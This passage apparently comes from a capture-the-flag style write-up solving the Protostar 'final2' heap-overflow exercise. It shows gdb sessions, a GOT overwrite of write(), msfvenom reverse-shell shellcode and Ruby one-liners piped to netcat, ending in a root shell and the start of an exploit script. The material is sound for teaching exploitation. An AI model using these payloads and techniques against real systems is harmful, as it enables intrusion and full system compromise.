</span><span class='line'>  <span class="k">for</span><span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">dll</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>                <span class="n">write</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="s">&quot;Process OK</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">strlen</span><span class="p">(</span><span class="s">&quot;Process OK</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">));</span>
</span><span class='line'>      <span class="n">free</span><span class="p">(</span><span class="n">destroylist</span><span class="p">[</span><span class="n">i</span><span class="p">]);</span>
</span><span class='line'>  <span class="p">}</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">envp</span><span class="p">)</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>  <span class="kt">int</span> <span class="n">fd</span><span class="p">;</span>
</span><span class='line'>  <span class="kt">char</span> <span class="o">*</span><span class="n">username</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>  <span class="cm">/* Run the process as a daemon */</span>
</span><span class='line'>  <span class="n">background_process</span><span class="p">(</span><span class="n">NAME</span><span class="p">,</span> <span class="n">UID</span><span class="p">,</span> <span class="n">GID</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>  <span class="cm">/* Wait for socket activity and return */</span>
</span><span class='line'>  <span class="n">fd</span> <span class="o">=</span> <span class="n">serve_forever</span><span class="p">(</span><span class="n">PORT</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>  <span class="cm">/* Set the client socket to STDIN, STDOUT, and STDERR */</span>
</span><span class='line'>  <span class="n">set_io</span><span class="p">(</span><span class="n">fd</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">get_requests</span><span class="p">(</span><span class="n">fd</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>The vulnerability is in this part of the source:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'>  <span class="n">p</span> <span class="o">=</span> <span class="n">rindex</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="sc">&#39;/&#39;</span><span class="p">);</span>
</span><span class='line'>  <span class="n">l</span> <span class="o">=</span> <span class="n">strlen</span><span class="p">(</span><span class="n">p</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">if</span><span class="p">(</span><span class="n">p</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>      <span class="n">start</span> <span class="o">=</span> <span class="n">strstr</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="s">&quot;ROOT&quot;</span><span class="p">);</span>
</span><span class='line'>      <span class="k">if</span><span class="p">(</span><span class="n">start</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>          <span class="k">while</span><span class="p">(</span><span class="o">*</span><span class="n">start</span> <span class="o">!=</span> <span class="sc">&#39;/&#39;</span><span class="p">)</span> <span class="n">start</span><span class="o">--</span><span class="p">;</span>
</span><span class='line'>          <span class="n">memmove</span><span class="p">(</span><span class="n">start</span><span class="p">,</span> <span class="n">p</span><span class="p">,</span> <span class="n">l</span><span class="p">);</span>
</span><span class='line'>          <span class="n">printf</span><span class="p">(</span><span class="s">&quot;moving from %p to %p (exploit: %s / %d)</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">p</span><span class="p">,</span> <span class="n">start</span><span class="p">,</span> <span class="n">start</span> <span class="o">&lt;</span> <span class="n">buf</span> <span class="o">?</span>  <span class="s">&quot;yes&quot;</span> <span class="o">:</span> <span class="s">&quot;no&quot;</span><span class="p">,</span> <span class="n">start</span> <span class="o">-</span> <span class="n">buf</span><span class="p">);</span>
</span><span class='line'>      <span class="p">}</span>
</span><span class='line'>  <span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>It expects message with the content <code>..../..ROOT.../next</code>, look for the rightmost <code>/</code>,
then searching for string <code>ROOT</code> and going leftside, it finds another <code>/</code>.</p>

<p>Finally, it copies <code>/next</code> after the left <code>/</code>, before <code>ROOT</code> and creates <code>..../next\x00T...</code></p>

<p>We need at least one slash, because <code>strlen(NULL)</code> segfaults. The security issue
is that if we don&rsquo;t set left slash, it continues to the left through different
chunk, for example:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>1st chunk: "FSRD" + "0" * 123 + "/"
</span><span class='line'>2nd chunk: "FSRD" + "ROOT/" + [0xfffffff8].pack("V") + [0xfffffffc].pack("V") + "AAAABBBB" + "X" * 103
</span><span class='line'>3rd chunk: "XXXX"</span></code></pre></td></tr></table></div></figure>


<p>In this case we copy everything after <code>ROOT/</code> to the 1st chunk and overwrite the chunk metadata, so we have classic heap overflow.</p>

<p>To verify our concept, we attach to the final2 process as root user:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
</pre></td><td class='code'><pre><code class=''><span class='line'># window 1:
</span><span class='line'>root@protostar:/tmp# gdb -q -ex 'set disassembly-flavor intel' -ex 'set follow-fork-mode child' -ex 'set detach-on-fork off' -x /home/user/.gdbinit -ex 'c' -p 1627
</span><span class='line'>
</span><span class='line'># window 2:
</span><span class='line'>user@protostar:/tmp$ ruby -e 'print "FSRD" + "0" * 123 +"/" + "FSRD" + "ROOT/" + [0xfffffff8].pack("V") + [0xfffffffc].pack("V") + "AAAABBBB" + "X" * 107' | nc 0 2993
</span><span class='line'>
</span><span class='line'># window 1:
</span><span class='line'>[New process 2405]
</span><span class='line'>
</span><span class='line'>Program received signal SIGSEGV, Segmentation fault.
</span><span class='line'>[Switching to process 2405]
</span><span class='line'>_______________________________________Current language:  auto
</span><span class='line'>The current source language is "auto; currently c".
</span><span class='line'>________________________________________
</span><span class='line'>     eax:41414141 ebx:B7FD7FF4  ecx:0804C2D6  edx:42424242     eflags:00010246
</span><span class='line'>     esi:00000000 edi:00000000  esp:BFFFF7E0  ebp:BFFFF828     eip:0804AAEF
</span><span class='line'>     cs:0073  ds:007B  es:007B  fs:0000  gs:0033  ss:007B    o d I t s Z a P c 
</span><span class='line'>[007B:BFFFF7E0]---------------------------------------------------------[stack]
</span><span class='line'>BFFFF810 : 42 42 42 42  41 41 41 41 - 18 E1 04 08  18 E1 04 08 BBBBAAAA........
</span><span class='line'>BFFFF800 : 88 E0 04 08  FC FF FF FF - 00 00 00 00  10 E1 04 08 ................
</span><span class='line'>BFFFF7F0 : 00 D5 04 08  00 E0 04 08 - 88 00 00 00  45 BD 04 08 ............E...
</span><span class='line'>BFFFF7E0 : 00 00 00 00  00 00 00 00 - 28 F8 FF BF  68 B5 04 08 ........(...h...
</span><span class='line'>[007B:41414141]---------------------------------------------------------[ data]
</span><span class='line'>41414141 : Error while running hook_stop:
</span><span class='line'>Cannot access memory at address 0x41414141
</span><span class='line'>0x0804aaef in free (mem=0x804e008) at final2/../common/malloc.c:3648
</span><span class='line'>3648  final2/../common/malloc.c: No such file or directory.
</span><span class='line'>  in final2/../common/malloc.c
</span><span class='line'>
</span><span class='line'>gdb> i r eax edx
</span><span class='line'>eax            0x41414141 0x41414141
</span><span class='line'>edx            0x42424242 0x42424242
</span><span class='line'>
</span><span class='line'>gdb> x /i $eip
</span><span class='line'>0x804aaef &lt;free+301>:  mov    DWORD PTR [eax+0xc],edx
</span><span class='line'>
</span><span class='line'>gdb> x /50x 0x804e010
</span><span class='line'>0x804e010:    0x30303030  0x30303030  0x30303030  0x30303030
</span><span class='line'>0x804e020:    0x30303030  0x30303030  0x30303030  0x30303030
</span><span class='line'>0x804e030:    0x30303030  0x30303030  0x30303030  0x30303030
</span><span class='line'>0x804e040:    0x30303030  0x30303030  0x30303030  0x30303030
</span><span class='line'>0x804e050:    0x30303030  0x30303030  0x30303030  0x30303030
</span><span class='line'>0x804e060:    0x30303030  0x30303030  0x30303030  0x30303030
</span><span class='line'>0x804e070:    0x30303030  0x30303030  0x30303030  0x30303030
</span><span class='line'>0x804e080:    0x30303030  0x2f303030  0xfffffff8  0xfffffffc
</span><span class='line'>0x804e090:    0x41414141  0x42424242  0x58585858  0x58585858
</span><span class='line'>0x804e0a0:    0x58585858  0x58585858  0x58585858  0x58585858
</span><span class='line'>0x804e0b0:    0x58585858  0x58585858  0x58585858  0x58585858
</span><span class='line'>0x804e0c0:    0x58585858  0x58585858  0x58585858  0x58585858
</span><span class='line'>0x804e0d0:    0x58585858  0x58585858</span></code></pre></td></tr></table></div></figure>


<p>We use <code>GOT</code> technique, modifing <code>write</code> and the shellcode will be stored in our first chunk (<code>0x804e010</code>).</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@protostar:/tmp# objdump -TR /opt/protostar/bin/final2 | grep "R_386_JUMP_SLOT.* write"
</span><span class='line'>0804d41c R_386_JUMP_SLOT   write
</span><span class='line'>
</span><span class='line'>(gdb) print /x 0x0804d41c-0x0c
</span><span class='line'>$1 = 0x804d410</span></code></pre></td></tr></table></div></figure>


<p>So we need to write <code>0x804e010</code> to <code>0x804d41c</code>.</p>

<p>To check where are usable data in our buffer, we use metasploit pattern:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
</pre></td><td class='code'><pre><code class=''><span class='line'># window 1:
</span><span class='line'>root@protostar:/tmp# gdb -q -ex 'set disassembly-flavor intel' -ex 'set follow-fork-mode child' -ex 'set detach-on-fork off' -x /home/user/.gdbinit -ex 'c' -p 1627
</span><span class='line'>
</span><span class='line'># window 2:
</span><span class='line'>user@protostar:/tmp$ ruby -e 'print "FSRD" + "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0" + "/" + "FSRD" + "ROOT/" + [0xfffffff8].pack("V") + [0xfffffffc].pack("V") + [0x804d410].pack("V") + [0x804e010].pack("V") + "X" * 107' | nc 0 2993
</span><span class='line'>
</span><span class='line'># window 1:
</span><span class='line'>Program received signal SIGSEGV, Segmentation fault.
</span><span class='line'>[Switching to process 2427]
</span><span class='line'>_______________________________________________________________________________
</span><span class='line'>     eax:B7FFEFF4 ebx:B7FE1848  ecx:FFFFFFFF  edx:0013F1CC     eflags:00010286
</span><span class='line'>     esi:BFFFF91C edi:00000001  esp:BFFFF8AC  ebp:B7FEBFC6     eip:0804E026
</span><span class='line'>     cs:0073  ds:007B  es:007B  fs:0000  gs:0033  ss:007B    o d I t S z a P c 
</span><span class='line'>[007B:BFFFF8AC]---------------------------------------------------------[stack]
</span><span class='line'>BFFFF8DC : FA 90 04 08  FC F8 FF BF - 05 00 00 00  00 00 00 00 ................
</span><span class='line'>BFFFF8CC : 11 00 20 01  00 00 00 00 - 28 67 E9 B7  08 F9 FF BF .. .....(g......
</span><span class='line'>BFFFF8BC : B0 FA FF B7  A7 D8 F2 B7 - 01 00 00 00  01 00 00 00 ................
</span><span class='line'>BFFFF8AC : E7 88 04 08  01 00 00 00 - F0 F8 FF BF  26 06 FF B7 ............&...
</span><span class='line'>[007B:BFFFF91C]---------------------------------------------------------[ data]
</span><span class='line'>BFFFF91C : 7B 00 00 00  7B 00 00 00 - 28 67 E9 B7  00 00 00 00 {...{...(g......
</span><span class='line'>BFFFF92C : 18 FC FF BF  EC FB FF BF - 11 00 20 01  00 00 00 00 .......... .....
</span><span class='line'>[0073:0804E026]---------------------------------------------------------[ code]
</span><span class='line'>0x804e026:    cmp    BYTE PTR [ecx+0x61],al
</span><span class='line'>0x804e029:    cmp    DWORD PTR [ecx+0x62],eax
</span><span class='line'>0x804e02c:    xor    BYTE PTR [ecx+0x62],al
</span><span class='line'>0x804e02f:    xor    DWORD PTR [ecx+0x62],eax
</span><span class='line'>0x804e032:    xor    al,BYTE PTR [ecx+0x62]
</span><span class='line'>0x804e035:    xor    eax,DWORD PTR [ecx+0x62]
</span><span class='line'>------------------------------------------------------------------------------
</span><span class='line'>0x0804e026 in ?? ()
</span><span class='line'>
</span><span class='line'>gdb> x /50x 0x804e010
</span><span class='line'>0x804e010:    0x61413161  0x33614132  0x0804d410  0x61413561
</span><span class='line'>0x804e020:    0x37614136  0x41386141  0x62413961  0x31624130
</span><span class='line'>0x804e030:    0x41326241  0x62413362  0x35624134  0x41367241
</span><span class='line'>0x804e040:    0x62413762  0x39624138  0x41306341  0x63413163
</span><span class='line'>0x804e050:    0x33634132  0x41346341  0x63413563  0x37634136
</span><span class='line'>0x804e060:    0x41386341  0x64413963  0x3584d130  0x41326449
</span><span class='line'>0x804e070:    0x64413364  0x35644134  0x41366441  0x64413764
</span><span class='line'>0x804e080:    0x39644138  0x00000084  0xfffffff8  0xfffffffc
</span><span class='line'>0x804e090:    0x0804d410  0x0804e010  0x58585858  0x58585858
</span><span class='line'>0x804e0a0:    0x58585858  0x58585858  0x58585858  0x58585858
</span><span class='line'>0x804e0b0:    0x58585858  0x58585858  0x58585858  0x58585858
</span><span class='line'>0x804e0c0:    0x58585858  0x58585858  0x58585858  0x58585858
</span><span class='line'>0x804e0d0:    0x58585858  0x58585858</span></code></pre></td></tr></table></div></figure>




<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:~# /usr/share/metasploit-framework/tools/pattern_offset.rb 0x61413161
</span><span class='line'>[*] Exact match at offset 4
</span><span class='line'>root@kali32:~# /usr/share/metasploit-framework/tools/pattern_offset.rb 0x61413561
</span><span class='line'>[*] Exact match at offset 16
</span><span class='line'>root@kali32:~# /usr/share/metasploit-framework/tools/pattern_offset.rb 0x39644138
</span><span class='line'>[*] Exact match at offset 116</span></code></pre></td></tr></table></div></figure>


<p>Our code starts at pattern offset <code>4</code>. There is also modification in the first <code>12</code> bytes, we use <code>2</code> bytes instruction and skip next <code>10</code> bytes, using <code>\xeb\x0a</code> opcode.</p>

<p>After another segfault, we have in gdb:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@protostar:/tmp# gdb -q -ex 'set disassembly-flavor intel' -ex 'set follow-fork-mode child' -ex 'set detach-on-fork off' -x /home/user/.gdbinit -ex 'c' -p 1627
</span><span class='line'>
</span><span class='line'>user@protostar:/tmp$ ruby -e 'print "FSRD" + "Aa0A" + "\xeb\x0a" + "X" * 10 + "a5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0" + "/" + "FSRD" + "ROOT/" + [0xfffffff8].pack("V") + [0xfffffffc].pack("V") + [0x804d410].pack("V") + [0x804e010].pack("V") + "X" *  107' | nc 0 2993
</span><span class='line'>
</span><span class='line'>gdb> x /i 0x804e010
</span><span class='line'>0x804e010:    jmp    0x804e01c
</span><span class='line'>
</span><span class='line'>gdb> x /30x 0x804e01c
</span><span class='line'>0x804e01c:    0x61413561  0x37614136  0x41386141  0x62413961
</span><span class='line'>0x804e02c:    0x31624130  0x41326241  0x62413362  0x35624134
</span><span class='line'>0x804e03c:    0x41366241  0x62413762  0x39624138  0x41306341
</span><span class='line'>0x804e04c:    0x63413163  0x33634132  0x41346341  0x63413563
</span><span class='line'>0x804e05c:    0x37634136  0x41386341  0x64413963  0x31644130
</span><span class='line'>0x804e06c:    0x41326441  0x64413364  0x35644134  0x41366441
</span><span class='line'>0x804e07c:    0x64413764  0x39644138  0x00000084  0xfffffff8
</span><span class='line'>0x804e08c:    0xfffffffc  0x0804d410
</span><span class='line'>
</span><span class='line'>user@protostar:/tmp$ ruby -e 'print "FSRD" + "Aa0A" + "\xeb\x0a" + "X" * 10 + "D" * 107" + "/" + "FSRD" + "ROOT/" + [0xfffffff8].pack("V") + [0xfffffffc].pack("V") + [0x804d410].pack("V") + [0x804e010].pack("V") + "X" *  107' | nc 0 2993
</span><span class='line'>
</span><span class='line'>gdb> x /30x 0x804e01c
</span><span class='line'>0x804e01c:    0x44444444  0x44444444  0x44444444  0x44444444
</span><span class='line'>0x804e02c:    0x44444444  0x44444444  0x44444444  0x44444444
</span><span class='line'>0x804e03c:    0x44444444  0x44444444  0x44444444  0x44444444
</span><span class='line'>0x804e04c:    0x44444444  0x44444444  0x44444444  0x44444444
</span><span class='line'>0x804e05c:    0x44444444  0x44444444  0x44444444  0x44444444
</span><span class='line'>0x804e06c:    0x44444444  0x44444444  0x44444444  0x44444444
</span><span class='line'>0x804e07c:    0x44444444  0x44444444  0x00000084  0xfffffff8
</span><span class='line'>0x804e08c:    0xfffffffc  0x0804d410</span></code></pre></td></tr></table></div></figure>


<p>We can see above, that we have <code>26*4=104</code> bytes for our shellcode.</p>

<p>Exploitation:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
</pre></td><td class='code'><pre><code class=''><span class='line'># window 1:
</span><span class='line'>
</span><span class='line'># we add 0x5c = '/' to our bad chars list
</span><span class='line'>root@kali32:~# /usr/share/metasploit-framework/msfvenom -p linux/x86/shell_reverse_tcp LHOST=127.0.0.1 LPORT=1337 -b '\x0a\x0d\x5c\x00' -f sh
</span><span class='line'>No platform was selected, choosing Msf::Module::Platform::Linux from the payload
</span><span class='line'>No Arch selected, selecting Arch: x86 from the payload
</span><span class='line'>Found 22 compatible encoders
</span><span class='line'>Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
</span><span class='line'>x86/shikata_ga_nai succeeded with size 95 (iteration=0)
</span><span class='line'>Payload size: 95 bytes
</span><span class='line'>export buf=\
</span><span class='line'>$'\xb8\x23\x99\xa0\xea\xdd\xc0\xd9\x74\x24\xf4\x5f\x2b\xc9'\
</span><span class='line'>$'\xb1\x12\x31\x47\x12\x03\x47\x12\x83\xe4\x9d\x42\x1f\xdb'\
</span><span class='line'>$'\x46\x75\x03\x48\x3a\x29\xae\x6c\x35\x2c\x9e\x16\x88\x2f'\
</span><span class='line'>$'\x4c\x8f\xa2\x0f\xbe\xaf\x8a\x16\xb9\xc7\x73\xe9\x39\x16'\
</span><span class='line'>$'\xe4\xeb\x39\x1d\xcd\x62\xd8\xad\x4b\x25\x4a\x9e\x20\xc6'\
</span><span class='line'>$'\xe5\xc1\x8a\x49\xa7\x69\x3a\x65\x3b\x01\x2c\x56\xd9\xb8'\
</span><span class='line'>$'\xc2\x21\xfe\x68\x48\xbb\xe0\x3c\x65\x76\x62'
</span><span class='line'>
</span><span class='line'># window 2:
</span><span class='line'>user@protostar:/tmp$ export buf=\
</span><span class='line'>> $'\xb8\x23\x99\xa0\xea\xdd\xc0\xd9\x74\x24\xf4\x5f\x2b\xc9'\
</span><span class='line'>> $'\xb1\x12\x31\x47\x12\x03\x47\x12\x83\xe4\x9d\x42\x1f\xdb'\
</span><span class='line'>> $'\x46\x75\x03\x48\x3a\x29\xae\x6c\x35\x2c\x9e\x16\x88\x2f'\
</span><span class='line'>> $'\x4c\x8f\xa2\x0f\xbe\xaf\x8a\x16\xb9\xc7\x73\xe9\x39\x16'\
</span><span class='line'>> $'\xe4\xeb\x39\x1d\xcd\x62\xd8\xad\x4b\x25\x4a\x9e\x20\xc6'\
</span><span class='line'>> $'\xe5\xc1\x8a\x49\xa7\x69\x3a\x65\x3b\x01\x2c\x56\xd9\xb8'\
</span><span class='line'>> $'\xc2\x21\xfe\x68\x48\xbb\xe0\x3c\x65\x76\x62'
</span><span class='line'>
</span><span class='line'># window 3:
</span><span class='line'>user@protostar:~$ nc -l -p 1337
</span><span class='line'>
</span><span class='line'># window 2:
</span><span class='line'>user@protostar:/tmp$ ruby -e 'print "FSRD" + "Aa0A" + "\xeb\x0a" + "X" * 10 + ENV["buf"] + "D" * (107 - ENV["buf"].length) + "/" + "FSRD" + "ROOT/" + [0xfffffff8].pack("V") + [0xfffffffc].pack("V") + [0x804d410].pack("V") + [0x804e010].pack("V") + "X" *  107' | nc 0 2993
</span><span class='line'>Process OK
</span><span class='line'>
</span><span class='line'># window 3:
</span><span class='line'>id
</span><span class='line'>uid=0(root) gid=0(root) groups=0(root)</span></code></pre></td></tr></table></div></figure>




<figure class='code'><figcaption><span>exploit-final2.rb </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
</pre></td><td class='code'><pre><code class='ruby'><span class='line'><span class="c1">#!/usr/bin/env ruby</span>
</span><span class='line'>
</span><span class='line'><span class="nb">require</span> <span class="s1">&#39;socket&#39;</span>
</span><span class='line'>
</span><span class='line'><span class="c1"># user@protostar:~$ objdump -TR /opt/protostar/bin/final2 | grep &quot;R_386_JUMP_SLOT.* write&quot;</span>
</span><span class='line'><span class="c1"># 0804d41c R_386_JUMP_SLOT   write</span>
</span><span class='line'>
</span><span class='line'><span class="c1"># gdb&gt; print /x 0x0804d41c-0xc</span>
</span><span class='line'><span class="c1"># $1 = 0x804d410</span>
</span><span class='line'>
</span><span class='line'><span class="c1"># root@protostar:/tmp# ltrace  -e memset -f /opt/protostar/bin/final2 </span>
</span><span class='line'><span class="c1"># [pid 2803] +++ exited (status 0) +++</span>
</span><span class='line'><span class="c1"># [pid 2804] memset(0xbffff71c, &#39;\000&#39;, 16)     = 0xbffff71c</span>
</span><span class='line'><span class="c1"># [pid 2807] memset(0x0804e008, &#39;\000&#39;, 132)    = 0x0804e008 &lt;= first chunk</span>
</span><span class='line'><span class="c1"># [pid 2807] memset(0x0804e090, &#39;\000&#39;, 132)    = 0x0804e090 &lt;= second chunk</span>
</span><span class='line'><span class="c1"># [pid 2807] memset(0x0804e118, &#39;\000&#39;, 132)    = 0x0804e118 &lt;= third chunk</span>
</span><span class='line'>
</span><span class='line'><span class="c1"># root@kali32:~# ruby -e &#39;puts &quot;0x&quot;+(0x0804e008+&quot;FSDRAa0A&quot;.length).to_s(16)&#39;</span>
</span><span class='line'><span class="c1"># 0x804e010</span>
</span><span class='line'>
</span><span class='line'><span class="c1"># root@kali32:~# /usr/share/metasploit-framework/msfvenom -p linux/x86/shell_reverse_tcp LHOST=127.0.0.1 LPORT=1337 -b &#39;\x0a\x0d\x5c\x00&#39; -f ruby</span>
</span><span class='line'><span class="c1"># No platform was selected, choosing Msf::Module::Platform::Linux from the payload</span>
</span><span class='line'><span class="c1"># No Arch selected, selecting Arch: x86 from the payload</span>
</span><span class='line'><span class="c1"># Found 22 compatible encoders</span>
